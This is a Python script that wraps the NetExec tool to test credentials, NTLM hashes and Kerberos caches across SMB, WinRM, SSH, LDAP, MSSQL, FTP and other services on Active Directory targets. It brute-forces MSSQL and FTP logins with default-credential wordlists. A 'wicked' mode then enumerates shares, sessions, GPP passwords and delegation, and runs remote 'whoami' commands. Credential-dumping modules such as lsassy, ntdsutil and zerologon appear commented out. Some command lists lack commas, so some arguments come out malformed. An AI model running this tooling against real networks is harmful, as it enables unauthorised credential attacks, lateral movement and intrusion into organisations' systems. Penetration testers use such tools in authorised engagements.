#!/usr/bin/env python3

import argparse
import os
import subprocess
import threading
import signal
import sys
from multiprocessing import cpu_count

'''
TODO:
- separate simple nxc mssql and ftp commands from brute
'''

# Define protocols and services to test
SERVICES = ["smb", "winrm", "ssh", "ftp", "rdp", "wmi", "ldap", "mssql", "vnc"]
stop_threads = False

def signal_handler(sig, frame):
    global stop_threads
    print("\nTermination signal received. Stopping all threads...")
    stop_threads = True
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def parse_arguments():
    parser = argparse.ArgumentParser(description="Enhance Active Directory security by testing multiple protocols and services with various authentication methods.")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-i', '--ip', help='Direct IP address or FQDN to test')
    group.add_argument('-t', '--targets-file', help='File containing list of IP addresses or FQDNs')

    parser.add_argument('-u', '--username', help='Username to test')
    parser.add_argument('-p', '--password', help='Password to test')
    parser.add_argument('-H', '--hashes-file', help='(Optional) File containing list of NTLM hashes')
    parser.add_argument('-k', '--ccache-file', help='(Optional) Specify Kerberos credential cache file for authentication')
    parser.add_argument('--kdcHost', '-dc', help='(Optional) Specify the KDC host for Kerberos authentication')
    parser.add_argument('--domain', '-d', help='(Optional) Specify the domain name')
    parser.add_argument('--dc-ip', help='(Optional) Specify the Domain Controller IP if KDC host cannot be resolved')
    parser.add_argument('--wicked', action='store_true', help='(Optional) Run additional commands for services')
    parser.add_argument('-b', '--bruteforce', action='store_true', help='(Optional) Enable brute-forcing for FTP and MSSQL')
    parser.add_argument('-o', '--output-dir', default='./output', help='(Optional) Specify output directory (default: ./output)')
    args = parser.parse_args()

    if not any([args.username, args.hashes_file, args.ccache_file]):
        parser.error('At least one of --username, --hashes-file, or --ccache-file must be provided.')

    return args

def read_targets(args):
    targets = []
    if args.targets_file:
        if not os.path.isfile(args.targets_file):
            print(f"Targets file '{args.targets_file}' not found.")
            exit(1)
        with open(args.targets_file, 'r') as f:
            targets = [line.strip() for line in f if line.strip()]
    else:
        targets = [args.ip]
    return targets

def execute_netexec(ip, service, auth_method, args, auth_methods):
    global stop_threads
    if stop_threads:
        return

    cmd = ["nxc", service, ip]

    # Build command based on authentication method
    if auth_method == "use_kcache":
        cmd.append("--use-kcache")
    elif auth_method == "user_pass_kerberos":
        cmd.extend(["-u", args.username, "-p", args.password, "-k"])
    elif auth_method == "user_pass":
        cmd.extend(["-u", args.username, "-p", args.password])
    elif auth_method == "user_hash":
        cmd.extend(["-u", args.username, "-H", args.hashes_file])
    else:
        return

    # Append --continue-on-success if needed
    if auth_method not in ["use_kcache", "user_pass_kerberos"]:
        if args.bruteforce or len(auth_methods) > 1:
            cmd.append("--continue-on-success")

    env = os.environ.copy()
    if args.ccache_file:
        env['KRB5CCNAME'] = args.ccache_file

    output_file = os.path.join(args.output_dir, f"{ip}_{service}.out")
    error_log = os.path.join(args.output_dir, "error.log")

    try:
        result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=env, text=True, timeout=60)
        # Write all output to the output file
        with open(output_file, 'a') as f_out:
            f_out.write(result.stdout)
            if result.stderr:
                f_out.write(result.stderr)
        # Check if output contains "[+]"
        if "[+]" in result.stdout:
            # Print successful authentication to terminal, including the command used and auth method
            print(f"Success detected for {service} on {ip} with auth method {auth_method}. Command: {' '.join(cmd)}")

            # Only filter out error messages
            additional_output = [line for line in result.stdout.splitlines()
                                 if "Exception while calling proto_flow()" not in line
                                 and "Traceback (most recent call last)" not in line]
            if additional_output:
                print('\n'.join(additional_output))

            # Run additional commands if args.wicked is set
            if args.wicked:
                if service == "smb":
                    smb_commands = [
                        "--groups",
                        #"--interfaces",
                        #"--laps",
                        #"--local-group",
                        "--local-groups",
                        #"--lsa",
                        "--pass-pol",
                        #"--rid-brute",
                        #"--sam",
                        "--sessions",
                        #"--sccm",
                        #"--sccm disk",
                        #"--sccm wmi",
                        "--shares",
                        #"--users"
                        #"-M enum_ca",
                        "-M enum_dns",
                        "-M gpp_password",
                        #"-M gpp_autologin",
                        #"-M lsassy",
                        #"-M mremoteng",
                        #"-M msol",
                        #"-M nanodump",
                        #"-M nopac",
                        #"-M ntdsutil",
                        #"-M petitpotam",
                        #"-M procdump",
                        #"-M rdcman",
                        #"-M security-questions",
                        #"-M spider_plus",
                        #"-M spooler",
                        #"-M smbghost",
                        #"-M teams_localdb",
                        #"-M veeam",
                        #"-M vnc",
                        #"-M webdav",
                        #"-M zerologon",
                        #"-x whoami",
                        #"-X '$PSVersionTable'"
                    ]
                    for option in smb_commands:
                        if stop_threads:
                            return
                        cmd_option = cmd.copy()
                        if option == "--laps" and args.kdcHost:
                            cmd_option.extend(["--laps", "--kdcHost", args.kdcHost])
                        else:
                            cmd_option.extend(option.split())
                        try:
                            result_option = subprocess.run(cmd_option, stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=env, text=True, timeout=60)
                            with open(output_file, 'a') as f_out:
                                f_out.write(result_option.stdout)
                                if result_option.stderr:
                                    f_out.write(result_option.stderr)
                            additional_output = [line for line in result_option.stdout.splitlines()
                                                 if "[+]" not in line and "[*]" not in line
                                                 and "Exception while calling proto_flow()" not in line
                                                 and "Traceback (most recent call last)" not in line]
                            if "Traceback (most recent call last)" in result_option.stdout:
                                print(f"An error occurred while executing command: {' '.join(cmd_option)}. Check the error log for details.")
                            elif additional_output:
                                # Display "Executing nxc ..." only if there's additional output
                                print(f"Executing nxc smb {ip} {' '.join(cmd_option[3:])}")
                                print('\n'.join(additional_output))
                        except subprocess.TimeoutExpired:
                            print(f"Command timed out: {' '.join(cmd_option)}")
                elif service == "ldap":
                    ldap_commands = [
                        "--active-users",
                        "--trusted-for-delegation",
                        "--groups",
                        "--gmsa",
                        "--users"
                        # Removed "--user-count"
                        "-M adcs",
                        f"-M daclread -o TARGET={args.kdcHost if args.kdcHost else ip} ACTION=read",
                        "-M enum_trusts",
                        #"-M get-network -o ALL=true",
                        #"-M laps",
                        #"-M ldap-checker",
                        "-M user-desc"
                    ]
                    for option in ldap_commands:
                        if stop_threads:
                            return
                        cmd_option = cmd.copy()
                        cmd_option.extend(option.split())
                        try:
                            result_option = subprocess.run(cmd_option, stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=env, text=True, timeout=60)
                            with open(output_file, 'a') as f_out:
                                f_out.write(result_option.stdout)
                                if result_option.stderr:
                                    f_out.write(result_option.stderr)
                            additional_output = [line for line in result_option.stdout.splitlines()
                                                 if "[+]" not in line and "[*]" not in line
                                                 and "Exception while calling proto_flow()" not in line
                                                 and "Traceback (most recent call last)" not in line]
                            if "Traceback (most recent call last)" in result_option.stdout:
                                print(f"An error occurred while executing command: {' '.join(cmd_option)}. Check the error log for details.")
                            elif additional_output:
                                # Display "Executing nxc ..." only if there's additional output
                                print(f"Executing nxc ldap {ip} {' '.join(cmd_option[3:])}")
                                print('\n'.join(additional_output))
                        except subprocess.TimeoutExpired:
                            print(f"Command timed out: {' '.join(cmd_option)}")
                elif service in ["winrm", "ssh", "wmi"]:
                    commands = ["-x whoami"]
                    cmd_option = cmd + commands
                    try:
                        result_option = subprocess.run(cmd_option, stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=env, text=True, timeout=60)
                        with open(output_file, 'a') as f_out:
                            f_out.write(result_option.stdout)
                            if result_option.stderr:
                                f_out.write(result_option.stderr)
                        additional_output = [line for line in result_option.stdout.splitlines()
                                             if "[+]" not in line and "[*]" not in line
                                             and "Exception while calling proto_flow()" not in line
                                             and "Traceback (most recent call last)" not in line]
                        if "Traceback (most recent call last)" in result_option.stdout:
                            print(f"An error occurred while executing command: {' '.join(cmd_option)}. Check the error log for details.")
                        elif additional_output:
                            # Display "Executing nxc ..." only if there's additional output
                            print(f"Executing nxc {service} {ip} {' '.join(commands)}")
                            print('\n'.join(additional_output))
                    except subprocess.TimeoutExpired:
                        print(f"Command timed out: {' '.join(cmd_option)}")

            # Removed "No additional commands for {service}." output
        else:
            pass  # Authentication failed

        # Brute-force logic (independent of 'wicked')
        if service == "mssql" and args.bruteforce:
            # Brute-force code remains unchanged...
            # Try "sa" with empty password
            mssql_auths = [("sa", "")]
            # Read default credentials from file
            cred_file = "/opt/SecLists/Passwords/Default-Credentials/mssql-betterdefaultpasslist.txt"
            if os.path.isfile(cred_file):
                with open(cred_file, 'r') as creds:
                    for line in creds:
                        user_pass = line.strip().split(':')
                        if len(user_pass) == 2:
                            mssql_auths.append((user_pass[0], user_pass[1]))
            else:
                print(f"Credential file {cred_file} not found.")
            # Try each credential
            for user, passwd in mssql_auths:
                if stop_threads:
                    return
                cmd_auth = ["nxc", "mssql", ip, "-u", user, "-p", passwd, "--continue-on-success"]
                try:
                    result_auth = subprocess.run(cmd_auth, stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=env, text=True, timeout=60)
                    with open(output_file, 'a') as f_out:
                        f_out.write(result_auth.stdout)
                        if result_auth.stderr:
                            f_out.write(result_auth.stderr)
                    if "[+]" in result_auth.stdout:
                        print(f"Successful MSSQL login with username: {user} and password: {passwd}. Command: {' '.join(cmd_auth)}")
                        additional_output = [line for line in result_auth.stdout.splitlines()
                                             if "[+]" not in line and "[*]" not in line
                                             and "Exception while calling proto_flow()" not in line
                                             and "Traceback (most recent call last)" not in line]
                        if "Traceback (most recent call last)" in result_auth.stdout:
                            print(f"An error occurred while executing command: {' '.join(cmd_auth)}. Check the error log for details.")
                        elif additional_output:
                            print('\n'.join(additional_output))
                        # Run additional commands if args.wicked is set
                        if args.wicked:
                            mssql_commands = [
                                "--local-auth"
                                "-M mssql_priv"
                                "-q SELECT name FROM master.dbo.sysdatabases;",
                                "-x whoami"
                            ]
                            for option in mssql_commands:
                                if stop_threads:
                                    return
                                cmd_option = cmd_auth + option.split()
                                try:
                                    result_option = subprocess.run(cmd_option, stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=env, text=True, timeout=60)
                                    with open(output_file, 'a') as f_out:
                                        f_out.write(result_option.stdout)
                                        if result_option.stderr:
                                            f_out.write(result_option.stderr)
                                    additional_output = [line for line in result_option.stdout.splitlines()
                                                         if "[+]" not in line and "[*]" not in line
                                                         and "Exception while calling proto_flow()" not in line
                                                         and "Traceback (most recent call last)" not in line]
                                    if "Traceback (most recent call last)" in result_option.stdout:
                                        print(f"An error occurred while executing command: {' '.join(cmd_option)}. Check the error log for details.")
                                    elif additional_output:
                                        print(f"Executing nxc mssql {ip} {' '.join(cmd_option[3:])}")
                                        print('\n'.join(additional_output))
                                except subprocess.TimeoutExpired:
                                    print(f"Command timed out: {' '.join(cmd_option)}")
                except subprocess.TimeoutExpired:
                    print(f"Command timed out: {' '.join(cmd_auth)}")

        elif service == "ftp" and args.bruteforce:
            # Read default credentials from file
            cred_file = "/opt/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt"
            if os.path.isfile(cred_file):
                with open(cred_file, 'r') as creds:
                    for line in creds:
                        if stop_threads:
                            return
                        user_pass = line.strip().split(':')
                        if len(user_pass) == 2:
                            user, passwd = user_pass
                            cmd_auth = ["nxc", "ftp", ip, "-u", user, "-p", passwd, "--continue-on-success"]
                            try:
                                result_auth = subprocess.run(cmd_auth, stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=env, text=True, timeout=60)
                                with open(output_file, 'a') as f_out:
                                    f_out.write(result_auth.stdout)
                                    if result_auth.stderr:
                                        f_out.write(result_auth.stderr)
                                if "[+]" in result_auth.stdout:
                                    print(f"Successful FTP login with username: {user} and password: {passwd}. Command: {' '.join(cmd_auth)}")
                                    additional_output = [line for line in result_auth.stdout.splitlines()
                                                         if "[+]" not in line and "[*]" not in line
                                                         and "Exception while calling proto_flow()" not in line
                                                         and "Traceback (most recent call last)" not in line]
                                    if "Traceback (most recent call last)" in result_auth.stdout:
                                        print(f"An error occurred while executing command: {' '.join(cmd_auth)}. Check the error log for details.")
                                    elif additional_output:
                                        print('\n'.join(additional_output))
                                    # Run additional commands if args.wicked:
                                    if args.wicked:
                                        ftp_commands = [
                                            "--ls /"
                                        ]
                                        for option in ftp_commands:
                                            if stop_threads:
                                                return
                                            cmd_option = cmd_auth + option.split()
                                            try:
                                                result_option = subprocess.run(cmd_option, stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=env, text=True, timeout=60)
                                                with open(output_file, 'a') as f_out:
                                                    f_out.write(result_option.stdout)
                                                    if result_option.stderr:
                                                        f_out.write(result_option.stderr)
                                                additional_output = [line for line in result_option.stdout.splitlines()
                                                                     if "[+]" not in line and "[*]" not in line
                                                                     and "Exception while calling proto_flow()" not in line
                                                                     and "Traceback (most recent call last)" not in line]
                                                if "Traceback (most recent call last)" in result_option.stdout:
                                                    print(f"An error occurred while executing command: {' '.join(cmd_option)}. Check the error log for details.")
                                                elif additional_output:
                                                    print(f"Executing nxc ftp {ip} {' '.join(cmd_option[3:])}")
                                                    print('\n'.join(additional_output))
                                            except subprocess.TimeoutExpired:
                                                print(f"Command timed out: {' '.join(cmd_option)}")
                            except subprocess.TimeoutExpired:
                                print(f"Command timed out: {' '.join(cmd_auth)}")
            else:
                print(f"Credential file {cred_file} not found.")

    except subprocess.TimeoutExpired:
        print(f"Command timed out: {' '.join(cmd)}")
    except Exception as e:
        with open(error_log, 'a') as f_err:
            f_err.write(f"Error executing nxc for {service} on {ip} with auth method {auth_method}: {e}\n")
        print(f"An error occurred while executing {service} on {ip}. Check the error log for details.")


def main():
    args = parse_arguments()

    # Create output directory if it doesn't exist
    os.makedirs(args.output_dir, exist_ok=True)

    targets = read_targets(args)

    threads = []

    # Determine authentication methods to try based on provided options
    auth_methods = []

    if args.ccache_file:
        auth_methods.append("use_kcache")
    if args.username and args.password:
        auth_methods.append("user_pass")
        if args.kdcHost or args.ccache_file:
            auth_methods.append("user_pass_kerberos")

    if args.hashes_file and args.username:
        auth_methods.append("user_hash")

    for ip in targets:
        print(f"Processing target: {ip}")

        for service in SERVICES:
            if stop_threads:
                break
            print(f"Processing {service} on {ip} using auth methods: {', '.join(auth_methods)}")
            for auth_method in auth_methods:
                if stop_threads:
                    break
                t = threading.Thread(target=execute_netexec, args=(ip, service, auth_method, args, auth_methods))
                threads.append(t)
                t.start()

                # Limit the number of concurrent threads
                while threading.active_count() > cpu_count() * 2:
                    if stop_threads:
                        break
                    pass

        # Wait for all threads to finish for this target
        for t in threads:
            t.join()
        threads.clear()

    print(f"All tasks completed. Results are stored in the '{args.output_dir}' directory.")

if __name__ == "__main__":
    main()
